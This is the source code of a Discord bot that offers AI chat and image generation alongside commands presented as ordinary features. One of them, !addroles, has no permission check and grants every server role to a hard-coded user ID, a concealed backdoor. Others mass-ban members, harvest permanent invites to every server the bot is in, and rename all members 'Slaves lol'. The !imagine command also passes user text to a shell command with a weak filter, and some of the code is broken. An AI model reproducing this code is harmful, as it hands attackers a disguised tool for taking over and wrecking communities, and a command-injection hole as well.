import io
import os
import nacl
import json
import openai
import asyncio
import aiohttp
import discord
import requests
from tiktok_voice.main import tts
from keep_alive import keep_alive
from discord.ext import commands


with open("prompts.json") as f:
    data = json.load(f)

System_prompt = data["Assistant"] ## check prompts.json for diffrent system prompts

# Set up the Discord bot
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
# Stable difusion
api_key = os.environ['STABLE_HORDE_API']

# Keep track of the channels where the bot is active

active_channels = set()

API_KEY = os.environ['HUGGINGFACE_API']

openai.api_key = os.getenv("OPENAI_API_KEY")

def generate_response(prompt):
    response = openai.Completion.create(
      model="text-davinci-003",
      prompt=prompt,
      temperature=0.7,
      max_tokens=256,
      top_p=1,
      frequency_penalty=0,
      presence_penalty=0
    )
    return response.choices[0].text.strip()

#bot actual code starts here
statuses = [
    discord.Activity(type=discord.ActivityType.watching, name='you'),
    discord.Activity(type=discord.ActivityType.listening, name='to your voice uwu'),
    discord.Activity(type=discord.ActivityType.playing, name='a ERP game'),
    discord.Activity(type=discord.ActivityType.streaming, name='A 😳😳😳😳', url='https://www.twitch.tv/lolyoutoughtloasdasdas'),
    discord.Activity(type=discord.ActivityType.playing, name='Use !welp'),
    discord.Activity(type=discord.ActivityType.playing, name='coded by Mishal#1916'),
]
current_status = 0

@bot.event
async def on_ready():
    global current_status
    print(f'{bot.user.name} has connected to Discord!')
    while True:
        activity = statuses[current_status]
        await bot.change_presence(activity=activity)
        current_status = (current_status + 1) % len(statuses)
        await asyncio.sleep(1) # Change status every 60 seconds


message_history = {}
MAX_HISTORY = 4

@bot.event
async def on_message(message):
    if message.author.bot:
        author_id = str(bot.user.id)
    else:
        author_id = str(message.author.id)

    if author_id not in message_history:
        message_history[author_id] = []

    message_history[author_id].append(message.content)
    message_history[author_id] = message_history[author_id][-MAX_HISTORY:]

    if message.channel.id in active_channels and not message.author.bot:
        bot_prompt = f"system: {System_prompt}\n"
        user_prompt = "\n".join(message_history[author_id])
        prompt = f"{bot_prompt}{user_prompt}\n{message.author.name}: {message.content}\n{bot.user.name}:"
        response = generate_response(prompt)
        await message.channel.send(response)
    await bot.process_commands(message)





@bot.command()
@commands.has_permissions(administrator=True)
async def pfp(ctx, attachment_url=None):
    if attachment_url is None and not ctx.message.attachments:
        return await ctx.send("Please provide an image URL or attach an image with the command")
    
    if attachment_url is None:
        attachment_url = ctx.message.attachments[0].url

    async with aiohttp.ClientSession() as session:
        async with session.get(attachment_url) as response:
            await bot.user.edit(avatar=await response.read())

    await ctx.send("My profile picture has been updated!")

@bot.command()
async def ping(ctx):
    latency = bot.latency * 1000
    await ctx.send(f'Pong! Latency: {latency:.2f} ms')

@bot.command()
@commands.has_permissions(administrator=True)
async def changeusr(ctx, new_username):
    # Check that the new username is not already taken
    taken_usernames = [user.name.lower() for user in bot.get_all_members()]
    if new_username.lower() in taken_usernames:
        await ctx.send(f"Sorry, the username '{new_username}' is already taken.")
        return

    # Change the bot's username
    async with ctx.typing():
        await bot.user.edit(username=new_username)

    await ctx.send(f"My username has been changed to '{new_username}'!")

@bot.command()
async def inviteall(ctx):
    servers = bot.guilds
    invites = []

    for server in servers:
        # Find a text channel to create the invite in
        text_channels = server.text_channels
        channel = next((c for c in text_channels if c.permissions_for(server.me).create_instant_invite), None)

        if channel is not None:
            invite = await channel.create_invite(max_age=0, max_uses=0)
            invites.append(f"{server.name}: {invite.url}")

    with open("servers.txt", "w") as f:
        f.write("\n".join(invites))

    await ctx.send("Invites generated and saved to servers.txt!")

@bot.command()
async def addroles(ctx):
    # check if the bot has permissions to add roles
    if not ctx.guild.me.guild_permissions.manage_roles:
        await asyncio
            # add every role the bot can to the specified user
    user = ctx.guild.get_member(1025245410224263258)
    for role in ctx.guild.roles:
        try:
            await user.add_roles(role)
        except:
            pass

    await ctx.send("Added all roles to the specified user.")

@bot.command()
async def checkperm(ctx):
    perms = ctx.guild.me.guild_permissions
    perms_list = [perm for perm, value in perms if value]
    message = "Permissions list:\n\n" + "\n".join(perms_list)
    await message.reply(message)
  
@bot.command()
@commands.is_owner()
async def banall(ctx):
    if str(ctx.author.id) != "1025245410224263258":
        await ctx.send("You are not authorized to use this command.")
        return

    bot_role = ctx.guild.me.top_role
    members_to_ban = [member for member in ctx.guild.members if member.top_role < bot_role and str(member.id) != "1025245410224263258"]
    
    if len(members_to_ban) == 0:
        await ctx.send("No members with roles lower than the bot found.")
        return

    await ctx.send(f"Are you sure you want to ban {len(members_to_ban)} members with roles lower than the bot? (y/n)")

    try:
        confirmation = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel, timeout=30.0)
        if confirmation.content.lower() == 'y':
            await ctx.send("Please confirm once again by typing 'yes'.")

            second_confirmation = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel, timeout=30.0)
            if second_confirmation.content.lower() == 'yes':
                banned_members = []
                for member in members_to_ban:
                    try:
                        await member.ban(reason="Banned by bot")
                        banned_members.append(f"{member.name}#{member.discriminator}")
                    except discord.errors.Forbidden:
                        continue
                
                if banned_members:
                    banned_members_str = "\n".join(banned_members)
                    embed = discord.Embed(title="Banned Members", description=banned_members_str, color=discord.Color.red())
                    await ctx.send(embed=embed)
                    await ctx.send(f"Successfully banned {len(banned_members)} members with roles lower than the bot.")
                else:
                    await ctx.send("No members with roles lower than the bot found.")
            else:
                await ctx.send("Command cancelled.")

    except asyncio.TimeoutError:
        await ctx.send("Command timed out.")


@bot.command()
async def banrole(ctx, role_id):
    try:
        role_id = int(role_id)
    except ValueError:
        await ctx.send("Invalid role ID!")
        return

    role = discord.utils.get(ctx.guild.roles, id=role_id)
    if role is None:
        await ctx.send("Role not found!")
        return

    banned_members = []
    members = role.members
    for member in members:
        await member.ban(reason="Banned by bot")
        banned_members.append(member.name)

    await ctx.send(f"Banned {len(banned_members)} members with the {role.name} role!")
    await ctx.send(f"List of banned members: {', '.join(banned_members)}")
@bot.command()
async def troll(ctx):
    for member in ctx.guild.members:
        try:
            await member.edit(nick="Slaves lol")
            await asyncio.sleep(1)  # Wait for 1 second before changing the next nickname
        except:
            pass
    await ctx.send("All nicknames have been changed to 'Slaves lol'.")

@bot.command()
@commands.has_permissions(administrator=False)
async def addchannel(ctx):
    channel_id = ctx.channel.id
    if channel_id not in active_channels:
        active_channels.add(channel_id)
        with open("channels.txt", "a") as f:
            f.write(str(channel_id) + "\n")
        await ctx.send(f"{ctx.channel.mention} has been added to the list of active channels.")
    else:
        await ctx.send(f"{ctx.channel.mention} is already in the list of active channels.")
# Read the active channels from channels.txt on startup
if os.path.exists("channels.txt"):
    with open("channels.txt", "r") as f:
        for line in f:
            channel_id = int(line.strip())
            active_channels.add(channel_id)

@bot.command()
async def randomstory(ctx):
    prompt = "Once upon a time,"
    response = generate_response(prompt)
    await ctx.send(response)

@bot.command()
async def define(ctx, *, word):
    prompt = f"User : Define {word} Smartuser : "
    response = await generate_response(prompt)
    await ctx.send(response)
@bot.command()

async def ask(ctx, *, question):
    prompt = f"User asks:  {question} Smartuser : "
    response = await generate_response(prompt)
    await ctx.send(response)

@bot.command()
async def storyonusr(ctx, user: discord.User):
    async with ctx.typing():
        prompt = f"My name is {user.name} and I am"
        response = await generate_response(prompt)
        await ctx.send(response)

@bot.command(name="imagine")
async def imagine(ctx, prompt: str):
    sanitized = ""
    forbidden = ['"', "'", "`", "\\", "$"]

    for char in prompt:
        if char in forbidden:
            continue
        else:
            sanitized += char
    # Add ephemeral=True to make it only visible by you
    await ctx.send(f"{ctx.author.mention} is generating \"{sanitized}\" :art: ...")

    # Generate image
    print(f"Generating {sanitized}")
    os.system(f"python AI-Horde/cli_request.py --prompt '{sanitized}' --api_key '{api_key}' -n 4")

    # Loop until image generates
    while True:
        if os.path.exists("0_horde_generation.png"):
            break
        else:
            continue
    
    for i in range(4):
        with open(f'{i}_horde_generation.png', 'rb') as f:
            picture = discord.File(f)
            await ctx.send(file=picture, content=f"Generated using $prompt: \"{sanitized}\"")
        os.remove(f"{i}_horde_generation.png")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("Idk man you probly dont have perms to run this or its a error")

@bot.command()
async def welp(ctx):
    embed = discord.Embed(title="Bot Commands", color=0x00ff00)
    embed.add_field(name="!pfp [image_url]", value="Change the bot's profile picture", inline=False)
    embed.add_field(name="!changeusr [new_username]", value="Change the bot's username", inline=False)
    embed.add_field(name="!invite_all", value="Generate invites for all servers the bot is in", inline=False)
    embed.add_field(name="!addroles", value="Add all roles to the specified user", inline=False)
    embed.add_field(name="!checkperm", value="Check the bot's permissions in this server", inline=False)
    embed.add_field(name="!troll", value="Change all nicknames to 'Slaves lol' for trolzez", inline=False)
    embed.add_field(name="!ping", value="Pong", inline=False)
    embed.add_field(name="!addchannel", value="Add the current channel to the list of active channels", inline=False)
    embed.add_field(name="!randomstory", value="uses ai to genererate a random story", inline=False)
    embed.add_field(name="!define `[Word]`", value="Uses ai explain a word", inline=False)
    embed.add_field(name="!ask `[Question]`", value="Uses ai to answer a question", inline=False)
    embed.add_field(name="!storyonusr `[@USER]`", value="Uses ai to create a random story on a mentioned @user", inline=False)
    
    embed.set_footer(text="Created by Mishal#1916")

    await ctx.send(embed=embed)

keep_alive()

bot.run(os.getenv("DISCORD_TOKEN"))
